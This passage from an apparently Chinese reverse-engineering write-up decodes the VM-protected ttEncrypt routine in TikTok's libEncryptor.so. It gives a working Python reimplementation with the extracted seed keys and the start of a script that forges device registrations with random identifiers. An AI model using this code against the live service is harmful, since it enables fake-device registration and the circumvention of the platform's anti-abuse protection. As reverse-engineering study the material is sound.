rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tSTR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt, <span style="color: rgb(255, 115, 253);">32</span>)}</span>, [<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>]"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">52</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span><br />                                                imm16 = get_imm16(opcode, <span style="color: rgb(198, 197, 254);">False</span>)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tMOVZ\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt, <span style="color: rgb(255, 115, 253);">32</span>)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>, LSL#16"</span>)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">' '</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">' '</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tSXTW\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt, <span style="color: rgb(255, 115, 253);">32</span>)}</span>"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> _:<br />                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">3</span>                   <br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\t&gt;&gt; op1_xxx\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>)<br />                                <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(150, 203, 254);">not</span> liner_disasm:                                        branch_pipeline_process()                                record_insns(dcode_insns_status, known_insns_op1, known_insns_op2, unknown_insts_op1, unknown_insts_op2, opcode)<br />                        <span style="color: rgb(150, 203, 254);">else</span>:<br />                                print(<span style="color: rgb(168, 255, 96);">"error"</span>)                    decode_statistics(known_insns_op1, known_insns_op2, unknown_insts_op1, unknown_insts_op2)<br />        <span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">main</span>():<br />                <span style="color: rgb(146, 255, 184);"># 解码vm2</span><br />                pcode_start = <span style="color: rgb(255, 115, 253);">0xB090</span><br />                pcode_size = <span style="color: rgb(255, 115, 253);">0x2D8</span>                decode(pcode_start, pcode_size)<br />                <span style="color: rgb(146, 255, 184);"># # 解码vm3,获取aes的key和iv</span><br />                pcode_start = <span style="color: rgb(255, 115, 253);">0xBDE0</span><br />                pcode_size = <span style="color: rgb(255, 115, 253);">0x1C8</span>                decode(pcode_start, pcode_size)<br />                <span style="color: rgb(146, 255, 184);"># 解码vm1,JNI_OnLoad</span><br />                pcode_start = <span style="color: rgb(255, 115, 253);">0x85C0</span><br />                pcode_size = <span style="color: rgb(255, 115, 253);">0xCC</span>                decode(pcode_start, pcode_size)<br />        <span style="color: rgb(150, 203, 254);">if</span> __name__ == <span style="color: rgb(168, 255, 96);">"__main__"</span>:<br />                main()</code></pre><h2>vm2伪汇编分析</h2><p>vm2还原的伪汇编代码，经过分析主要做了这些事件:</p><ol><li style="margin-left: 2px;"><p>保存寄存器环境</p></li><li style="margin-left: 2px;"><p>解密外部函数地址</p></li><li style="margin-left: 2px;"><p>生成随机数</p></li><li style="margin-left: 2px;"><p>以随机数为入参生成aes加密的key和iv</p></li><li style="margin-left: 2px;"><p>生成pSrcBuffer的hash</p></li><li style="margin-left: 2px;"><p>拼接数据hash+scrBuffer</p></li><li style="margin-left: 2px;"><p>aes加密拼接的数据</p></li><li style="margin-left: 2px;"><p>拼接加密结果: magic(0x6字节) + randNumber(0x20字节) + aesOut</p></li><li style="margin-left: 2px;"><p>恢复寄存器环境<br /></p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=509eddd2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3D1IBVA2V7b1PCuQB0fiaUIDWT4B0EDbEkibeL5sLAoiboeFOESzIvibOww%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></li></ol><h2>vm3伪汇编分析</h2><p>由于vm2会调用vm3生成aes的key和iv，因此vm3的代码也需要解析还原<span style="font-weight: 700;">generate_aes_key_iv.asm</span>：</p><ol><li style="margin-left: 2px;"><p>保存寄存器环境</p></li><li style="margin-left: 2px;"><p>解密外部函数地址</p></li><li style="margin-left: 2px;"><p>对随机数生成hash</p></li><li style="margin-left: 2px;"><p>解密种子数据</p></li><li style="margin-left: 2px;"><p>对随机数生成hash和种子数据再次生成hash</p></li><li style="margin-left: 2px;"><p>再次生成的hash数据中截取key和iv</p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;">恢复寄存器环境<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d8960241&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3ZJVbPRoydJyBfiatJTERnXVpsYvDlTfwAicUIxuOiaKK0vsBHXFFAjQKQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p style="margin-bottom: 15px;"><br /></p><h2 style="margin-top: 8px; margin-bottom: 16px; padding-bottom: 0.3em; font-size: 1.5em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204); color: rgb(0, 0, 0);">最终算法</h2><p style="margin-bottom: 15px;">这就是libEncryptor.so中ttEncrypt函数的加密算法了。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> secrets<br /><span style="color: rgb(150, 203, 254);">import</span> hashlib<br /><span style="color: rgb(150, 203, 254);">from</span> Crypto.Cipher <span style="color: rgb(150, 203, 254);">import</span> AES   <span style="color: rgb(146, 255, 184);"># pip install pycryptodome</span><br /><span style="color: rgb(150, 203, 254);">from</span> Crypto.Util.Padding <span style="color: rgb(150, 203, 254);">import</span> pad, unpad<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">generate_rand_number</span>():<br />        <span style="color: rgb(150, 203, 254);">return</span> secrets.token_bytes(<span style="color: rgb(255, 115, 253);">32</span>)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">decrypt_seeds</span>():<br />        key1 =  [<span style="color: rgb(255, 115, 253);">0x52</span>, <span style="color: rgb(255, 115, 253);">0x09</span>, <span style="color: rgb(255, 115, 253);">0x6A</span>, <span style="color: rgb(255, 115, 253);">0xD5</span>, <span style="color: rgb(255, 115, 253);">0x30</span>, <span style="color: rgb(255, 115, 253);">0x36</span>, <span style="color: rgb(255, 115, 253);">0xA5</span>, <span style="color: rgb(255, 115, 253);">0x38</span>, <span style="color: rgb(255, 115, 253);">0xBF</span>, <span style="color: rgb(255, 115, 253);">0x40</span>, <span style="color: rgb(255, 115, 253);">0xA3</span>, <span style="color: rgb(255, 115, 253);">0x9E</span>, <span style="color: rgb(255, 115, 253);">0x81</span>, <span style="color: rgb(255, 115, 253);">0xF3</span>, <span style="color: rgb(255, 115, 253);">0xD7</span>, <span style="color: rgb(255, 115, 253);">0xFB</span>]<br />        key1 += [<span style="color: rgb(255, 115, 253);">0x7C</span>, <span style="color: rgb(255, 115, 253);">0xE3</span>, <span style="color: rgb(255, 115, 253);">0x39</span>, <span style="color: rgb(255, 115, 253);">0x82</span>, <span style="color: rgb(255, 115, 253);">0x9B</span>, <span style="color: rgb(255, 115, 253);">0x2F</span>, <span style="color: rgb(255, 115, 253);">0xFF</span>, <span style="color: rgb(255, 115, 253);">0x87</span>, <span style="color: rgb(255, 115, 253);">0x34</span>, <span style="color: rgb(255, 115, 253);">0x8E</span>, <span style="color: rgb(255, 115, 253);">0x43</span>, <span style="color: rgb(255, 115, 253);">0x44</span>, <span style="color: rgb(255, 115, 253);">0xC4</span>, <span style="color: rgb(255, 115, 253);">0xDE</span>, <span style="color: rgb(255, 115, 253);">0xE9</span>, <span style="color: rgb(255, 115, 253);">0xCB</span>]<br />        key1 += [<span style="color: rgb(255, 115, 253);">0x54</span>, <span style="color: rgb(255, 115, 253);">0x7B</span>, <span style="color: rgb(255, 115, 253);">0x94</span>, <span style="color: rgb(255, 115, 253);">0x32</span>, <span style="color: rgb(255, 115, 253);">0xA6</span>, <span style="color: rgb(255, 115, 253);">0xC2</span>, <span style="color: rgb(255, 115, 253);">0x23</span>, <span style="color: rgb(255, 115, 253);">0x3D</span>, <span style="color: rgb(255, 115, 253);">0xEE</span>, <span style="color: rgb(255, 115, 253);">0x4C</span>, <span style="color: rgb(255, 115, 253);">0x95</span>, <span style="color: rgb(255, 115, 253);">0x0B</span>, <span style="color: rgb(255, 115, 253);">0x42</span>, <span style="color: rgb(255, 115, 253);">0xFA</span>, <span style="color: rgb(255, 115, 253);">0xC3</span>, <span style="color: rgb(255, 115, 253);">0x4E</span>]<br />        key1 += [<span style="color: rgb(255, 115, 253);">0x08</span>, <span style="color: rgb(255, 115, 253);">0x2E</span>, <span style="color: rgb(255, 115, 253);">0xA1</span>, <span style="color: rgb(255, 115, 253);">0x66</span>, <span style="color: rgb(255, 115, 253);">0x28</span>, <span style="color: rgb(255, 115, 253);">0xD9</span>, <span style="color: rgb(255, 115, 253);">0x24</span>, <span style="color: rgb(255, 115, 253);">0xB2</span>, <span style="color: rgb(255, 115, 253);">0x76</span>, <span style="color: rgb(255, 115, 253);">0x5B</span>, <span style="color: rgb(255, 115, 253);">0xA2</span>, <span style="color: rgb(255, 115, 253);">0x49</span>, <span style="color: rgb(255, 115, 253);">0x6D</span>, <span style="color: rgb(255, 115, 253);">0x8B</span>, <span style="color: rgb(255, 115, 253);">0xD1</span>, <span style="color: rgb(255, 115, 253);">0x25</span>]<br />        key2 =  [<span style="color: rgb(255, 115, 253);">0x1F</span>, <span style="color: rgb(255, 115, 253);">0xDD</span>, <span style="color: rgb(255, 115, 253);">0xA8</span>, <span style="color: rgb(255, 115, 253);">0x33</span>, <span style="color: rgb(255, 115, 253);">0x88</span>, <span style="color: rgb(255, 115, 253);">0x07</span>, <span style="color: rgb(255, 115, 253);">0xC7</span>, <span style="color: rgb(255, 115, 253);">0x31</span>, <span style="color: rgb(255, 115, 253);">0xB1</span>, <span style="color: rgb(255, 115, 253);">0x12</span>, <span style="color: rgb(255, 115, 253);">0x10</span>, <span style="color: rgb(255, 115, 253);">0x59</span>, <span style="color: rgb(255, 115, 253);">0x27</span>, <span style="color: rgb(255, 115, 253);">0x80</span>, <span style="color: rgb(255, 115, 253);">0xEC</span>, <span style="color: rgb(255, 115, 253);">0x5F</span>]<br />        key2 += [<span style="color: rgb(255, 115, 253);">0x60</span>, <span style="color: rgb(255, 115, 253);">0x51</span>, <span style="color: rgb(255, 115, 253);">0x7F</span>, <span style="color: rgb(255, 115, 253);">0xA9</span>, <span style="color: rgb(255, 115, 253);">0x19</span>, <span style="color: rgb(255, 115, 253);">0xB5</span>, <span style="color: rgb(255, 115, 253);">0x4A</span>, <span style="color: rgb(255, 115, 253);">0x0D</span>, <span style="color: rgb(255, 115, 253);">0x2D</span>, <span style="color: rgb(255, 115, 253);">0xE5</span>, <span style="color: rgb(255, 115, 253);">0x7A</span>, <span style="color: rgb(255, 115, 253);">0x9F</span>, <span style="color: rgb(255, 115, 253);">0x93</span>, <span style="color: rgb(255, 115, 253);">0xC9</span>, <span style="color: rgb(255, 115, 253);">0x9C</span>, <span style="color: rgb(255, 115, 253);">0xEF</span>]<br />        key2 += [<span style="color: rgb(255, 115, 253);">0xA0</span>, <span style="color: rgb(255, 115, 253);">0xE0</span>, <span style="color: rgb(255, 115, 253);">0x3B</span>, <span style="color: rgb(255, 115, 253);">0x4D</span>, <span style="color: rgb(255, 115, 253);">0xAE</span>, <span style="color: rgb(255, 115, 253);">0x2A</span>, <span style="color: rgb(255, 115, 253);">0xF5</span>, <span style="color: rgb(255, 115, 253);">0xB0</span>, <span style="color: rgb(255, 115, 253);">0xC8</span>, <span style="color: rgb(255, 115, 253);">0xEB</span>, <span style="color: rgb(255, 115, 253);">0xBB</span>, <span style="color: rgb(255, 115, 253);">0x3C</span>, <span style="color: rgb(255, 115, 253);">0x83</span>, <span style="color: rgb(255, 115, 253);">0x53</span>, <span style="color: rgb(255, 115, 253);">0x99</span>, <span style="color: rgb(255, 115, 253);">0x61</span>]<br />        key2 += [<span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">0x2B</span>, <span style="color: rgb(255, 115, 253);">0x04</span>, <span style="color: rgb(255, 115, 253);">0x7E</span>, <span style="color: rgb(255, 115, 253);">0xBA</span>, <span style="color: rgb(255, 115, 253);">0x77</span>, <span style="color: rgb(255, 115, 253);">0xD6</span>, <span style="color: rgb(255, 115, 253);">0x26</span>, <span style="color: rgb(255, 115, 253);">0xE1</span>, <span style="color: rgb(255, 115, 253);">0x69</span>, <span style="color: rgb(255, 115, 253);">0x14</span>, <span style="color: rgb(255, 115, 253);">0x63</span>, <span style="color: rgb(255, 115, 253);">0x55</span>, <span style="color: rgb(255, 115, 253);">0x21</span>, <span style="color: rgb(255, 115, 253);">0x0C</span>, <span style="color: rgb(255, 115, 253);">0x7D</span>]        results = bytearray()<br />        <span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(len(key1)):                results.append(key1[i] ^ key2[i])<br />        <span style="color: rgb(150, 203, 254);">return</span> results<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">sha512</span>(buff):        sha512_hash = hashlib.sha512()        sha512_hash.update(buff)<br />        <span style="color: rgb(150, 203, 254);">return</span> sha512_hash.digest()<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_aes_key_iv</span>(rand_num):            rand_num_hash = sha512(rand_num)            seeds = decrypt_seeds()        data = rand_num_hash + seeds            key_iv_hash = sha512(data)<br />        print(<span style="color: rgb(168, 255, 96);">f"rand_num:              <span style="color: rgb(218, 239, 163);">{rand_num.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"rand_num_hash:         <span style="color: rgb(218, 239, 163);">{rand_num_hash.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"seeds:                 <span style="color: rgb(218, 239, 163);">{seeds.hex()}</span>"</span>)    <br />        print(<span style="color: rgb(168, 255, 96);">f"rand_num_hash + seeds: <span style="color: rgb(218, 239, 163);">{data.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"key_iv_hash:           <span style="color: rgb(218, 239, 163);">{key_iv_hash.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"aes key:               <span style="color: rgb(218, 239, 163);">{key_iv_hash[<span style="color: rgb(255, 115, 253);">0</span>:<span style="color: rgb(255, 115, 253);">0x10</span>].hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"aes iv:                <span style="color: rgb(218, 239, 163);">{key_iv_hash[<span style="color: rgb(255, 115, 253);">0x10</span>:<span style="color: rgb(255, 115, 253);">0x20</span>].hex()}</span>"</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> key_iv_hash[<span style="color: rgb(255, 115, 253);">0</span>:<span style="color: rgb(255, 115, 253);">0x10</span>], key_iv_hash[<span style="color: rgb(255, 115, 253);">0x10</span>:<span style="color: rgb(255, 115, 253);">0x20</span>]<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">aes_128_cbc_encrypt</span>(plaintext, key, iv):<br />        <span style="color: rgb(146, 255, 184);"># 创建一个 AES 加密器对象</span>        cipher = AES.new(key, AES.MODE_CBC, iv)<br />        <span style="color: rgb(146, 255, 184);"># 添加填充并加密数据</span>        padded_data = pad(plaintext, AES.block_size)        ciphertext = cipher.encrypt(padded_data)<br />        <span style="color: rgb(150, 203, 254);">return</span> ciphertext<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_magic</span>():<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">b"\x74\x63\x05\x10\x00\x00"</span><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">ttEncrypt</span>(buff):        magic = get_magic()        rand_number = generate_rand_number()        aes_key, aes_iv = get_aes_key_iv(rand_number)        buff_hash = sha512(buff)        aes_plaintext = buff_hash + buff        aes_ciphertext = aes_128_cbc_encrypt(aes_plaintext, aes_key, aes_iv)<br />        print(<span style="color: rgb(168, 255, 96);">f"plaintext:     <span style="color: rgb(218, 239, 163);">{buff.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"rand_number:   <span style="color: rgb(218, 239, 163);">{rand_number.hex()}</span>"</span>)   <br />        print(<span style="color: rgb(168, 255, 96);">f"buff hash:     <span style="color: rgb(218, 239, 163);">{buff_hash.hex()}</span>"</span>) <br />        print(<span style="color: rgb(168, 255, 96);">f"aes_plaintext: <span style="color: rgb(218, 239, 163);">{aes_plaintext.hex()}</span>"</span>)<br />        print(<span style="color: rgb(168, 255, 96);">f"ciphertext:    <span style="color: rgb(218, 239, 163);">{aes_ciphertext.hex()}</span>"</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> magic + rand_number + aes_ciphertext<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">main</span>():<br />        buff = <span style="color: rgb(168, 255, 96);">b'aabbccddeeffgg'</span>            result = ttEncrypt(buff)<br />        print(<span style="color: rgb(168, 255, 96);">f"ttEncrypt: <span style="color: rgb(218, 239, 163);">{result.hex()}</span>"</span>)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">test_aes</span>():<br />        buff =  <span style="color: rgb(168, 255, 96);">b"\x61\x02\xbe\x54\xa6\x2a\x73\xe7\x65\xba\x38\xc9\x87\x34\x09\xbd"</span> +\<br />                        <span style="color: rgb(168, 255, 96);">b"\xeb\xb6\xb0\xd3\x7e\xa0\x60\x40\x3d\x0c\x26\xfe\xa5\xeb\xb6\xba"</span> +\<br />                        <span style="color: rgb(168, 255, 96);">b"\x5a\x0c\x7f\x36\xec\xb7\x58\xc7\x7e\x19\x37\x50\x5f\xa8\x5b\x4e"</span> +\<br />                        <span style="color: rgb(168, 255, 96);">b"\x77\xce\x82\x7a\x70\x09\xd2\x2b\x2f\xaf\xc4\x68\x00\xd7\xa9\xff"</span> +\<br />                        <span style="color: rgb(168, 255, 96);">b"\x62\x69\x61\x6e\x66\x65\x6e\x67"</span><br />        aes_key = <span style="color: rgb(168, 255, 96);">b"\xe8\xaf\x6e\x91\xde\x99\x7e\xf0\xfa\xfb\xcd\xbe\x97\x73\xb2\xc5"</span><br />        aes_iv = <span style="color: rgb(168, 255, 96);">b"\x03\x7e\xed\x97\x4e\x1e\xc5\x19\xdc\xc2\xb4\x35\x5b\x26\xf0\x1b"</span>           ciphertext = aes_128_cbc_encrypt(buff, aes_key, aes_iv)<br />        print(<span style="color: rgb(168, 255, 96);">f"ciphertext: <span style="color: rgb(218, 239, 163);">{ciphertext.hex()}</span>"</span>)<br /><span style="color: rgb(150, 203, 254);">if</span> __name__ == <span style="color: rgb(168, 255, 96);">"__main__"</span>:        main()<br />        <span style="color: rgb(146, 255, 184);"># test_aes()</span></code></pre></li></ol><p>为了验证算法是否有效，这里使用了dy模块中的ttEncrypt算和tt的设备注册代码：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> secrets<br /><span style="color: rgb(150, 203, 254);">import</span> uuid<br /><span style="color: rgb(150, 203, 254);">import</span> time<br /><span style="color: rgb(150, 203, 254);">import</span> json<br /><span style="color: rgb(150, 203, 254);">import</span> hashlib<br /><span style="color: rgb(150, 203, 254);">import</span> gzip<br /><span style="color: rgb(150, 203, 254);">import</span> requests <span style="color: rgb(146, 255, 184);"># pip install requests</span><br /><span style="color: rgb(150, 203, 254);">import</span> ttEncryptorUtil<br /><span style="color: rgb(146, 255, 184);"># 注: 协议来自Tiktok</span><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">UUID</span>():<br />    <span style="color: rgb(150, 203, 254);">return</span> str(uuid.uuid4())<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">md5</span>(message):    md5_hash = hashlib.md5()    md5_hash.update(message)<br />    <span style="color: rgb(150, 203, 254);">return</span> md5_hash.hexdigest()<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_timestamp_in_millisecond</span>():<br />    <span style="color: rgb(150, 203, 254);">return</span> int(time.time() * <span style="color: rgb(255, 115, 253);">1000</span>)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_timestamp_in_second</span>():<br />    <span style="color: rgb(150, 203, 254);">return</span> int(time.time())<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">generate_android_id</span>():<br />    <span style="color: rgb(150, 203, 254);">return</span> secrets.token_bytes(<span style="color: rgb(255, 115, 253);">8</span>).hex()<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">http_post</span>(url, headers, payload):    <br />    response = requests.request(<span style="color: rgb(168, 255, 96);">"POST"</span>, url, headers=headers, data=payload)    <br />    <span style="color: rgb(150, 203, 254);">return</span> response.text<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">gzip_compress</span>(buff):<br />    <span style="color: rgb(150, 203, 254);">return</span> gzip.compress(buff)<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_post_data</span>(android_id, cdid, google_aid, clientudid):        openudid = android_id    postDataObj = {<br />        <span style="color: rgb(168, 255, 96);">"magic_tag"</span>: <span style="color: rgb(168, 255, 96);">"ss_app_log"</span>,<br />        <span style="color: rgb(168, 255, 96);">"header"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"display_name"</span>: <span style="color: rgb(168, 255, 96);">"TikTok"</span>,<br />            <span style="color: rgb(168, 255, 96);">"update_version_code"</span>: <span style="color: rgb(255, 115, 253);">2023205030</span>,<br />            <span style="color: rgb(168, 255, 96);">"manifest_version_code"</span>: <span style="color: rgb(255, 115, 253);">2023205030</span>,<br />            <span style="color: rgb(168, 255, 96);">"app_version_minor"</span>: <span style="color: rgb(168, 255, 96);">""</span>,<br />            <span style="color: rgb(168, 255, 96);">"aid"</span>: <span style="color: rgb(255, 115, 253);">1233</span>,<br />            <span style="color: rgb(168, 255, 96);">"channel"</span>: <span style="color: rgb(168, 255, 96);">"googleplay"</span>,<br />            <span style="color: rgb(168, 255, 96);">"package"</span>: <span style="color: rgb(168, 255, 96);">"com.zhiliaoapp.musically"</span>,<br />            <span style="color: rgb(168, 255, 96);">"app_version"</span>: <span style="color: rgb(168, 255, 96);">"32.5.3"</span>,<br />            <span style="color: rgb(168, 255, 96);">"version_code"</span>: <span style="color: rgb(255, 115, 253);">320503</span>,<br />            <span style="color: rgb(168, 255, 96);">"sdk_version"</span>: <span style="color: rgb(168, 255, 96);">"3.9.17-bugfix.9"</span>,<br />            <span style="color: rgb(168, 255, 96);">"sdk_target_version"</span>: <span style="color: rgb(255, 115, 253);">29</span>,<br />            <span style="color: rgb(168, 255, 96);">"git_hash"</span>: <span style="color: rgb(168, 255, 96);">"3e93151"</span>,<br />            <span style="color: rgb(168, 255, 96);">"os"</span>: <span style="color: rgb(168, 255, 96);">"Android"</span>,<br />            <span style="color: rgb(168, 255, 96);">"os_version"</span>: <span style="color: rgb(168, 255, 96);">"11"</span>,<br />            <span style="color: rgb(168, 255, 96);">"os_api"</span>: <span style="color: rgb(255, 115, 253);">30</span>,<br />            <span style="color: rgb(168, 255, 96);">"device_model"</span>: <span style="color: rgb(168, 255, 96);">"Pixel 2"</span>,<br />            <span style="color: rgb(168, 255, 96);">"device_brand"</span>: <span style="color: rgb(168, 255, 96);">"google"</span>,<br />            <span style="color: rgb(168, 255, 96);">"device_manufacturer"</span>: <span style="color: rgb(168, 255, 96);">"Google"</span>,<br />            <span style="color: rgb(168, 255, 96);">"cpu_abi"</span>: <span style="color: rgb(168, 255, 96);">"arm64-v8a"</span>,<br />            <span style="color: rgb(168, 255, 96);">"release_build"</span>: <span style="color: rgb(168, 255, 96);">"e7cd5de_20231207"</span>,<br />            <span style="color: rgb(168, 255, 96);">"density_dpi"</span>: <span style="color: rgb(255, 115, 253);">420</span>,<br />            <span style="color: rgb(168, 255, 96);">"display_density"</span>: <span style="color: rgb(168, 255, 96);">"mdpi"</span>,<br />            <span style="color: rgb(168, 255, 96);">"resolution"</span>: <span style="color: rgb(168, 255, 96);">"1794x1080"</span>,<br />            <span style="color: rgb(168, 255, 96);">"language"</span>: <span style="color: rgb(168, 255, 96);">"en"</span>,<br />            <span style="color: rgb(168, 255, 96);">"timezone"</span>: -<span style="color: rgb(255, 115, 253);">5</span>,<br />            <span style="color: rgb(168, 255, 96);">"access"</span>: <span style="color: rgb(168, 255, 96);">"wifi"</span>,<br />            <span style="color: rgb(168, 255, 96);">"not_request_sender"</span>: <span style="color: rgb(255, 115, 253);">1</span>,<br />            <span style="color: rgb(168, 255, 96);">"rom"</span>: <span style="color: rgb(168, 255, 96);">"6934943"</span>,<br />            <span style="color: rgb(168, 255, 96);">"rom_version"</span>: <span style="color: rgb(168, 255, 96);">"RP1A.201005.004.A1"</span>,<br />            <span style="color: rgb(168, 255, 96);">"cdid"</span>: cdid,<br />            <span style="color: rgb(168, 255, 96);">"sig_hash"</span>: <span style="color: rgb(168, 255, 96);">"194326e82c84a639a52e5c023116f12a"</span>, <span style="color: rgb(146, 255, 184);"># md5(packageInfo.signatures[0]) </span><br />            <span style="color: rgb(168, 255, 96);">"gaid_limited"</span>: <span style="color: rgb(255, 115, 253);">0</span>,<br />            <span style="color: rgb(168, 255, 96);">"google_aid"</span>: google_aid,<br />            <span style="color: rgb(168, 255, 96);">"openudid"</span>: openudid,<br />            <span style="color: rgb(168, 255, 96);">"clientudid"</span>: clientudid,<br />            <span style="color: rgb(168, 255, 96);">"tz_name"</span>: <span style="color: rgb(168, 255, 96);">"America\\/New_York"</span>,<br />            <span style="color: rgb(168, 255, 96);">"tz_offset"</span>: -<span style="color: rgb(255, 115, 253);">18000</span>,<br />            <span style="color: rgb(168, 255, 96);">"req_id"</span>: UUID(),<br />            <span style="color: rgb(168, 255, 96);">"device_platform"</span>: <span style="color: rgb(168, 255, 96);">"android"</span>,<br />            <span style="color: rgb(168, 255, 96);">"custom"</span>: {<br />                <span style="color: rgb(168, 255, 96);">"is_kids_mode"</span>: <span style="color: rgb(255, 115, 253);">0</span>,<br />                <span style="color: rgb(168, 255, 96);">"filter_warn"</span>: <span style="color: rgb(255, 115, 253);">0</span>,<br />                <span style="color: rgb(168, 255, 96);">"web_ua"</span>: <span style="color: rgb(168, 255, 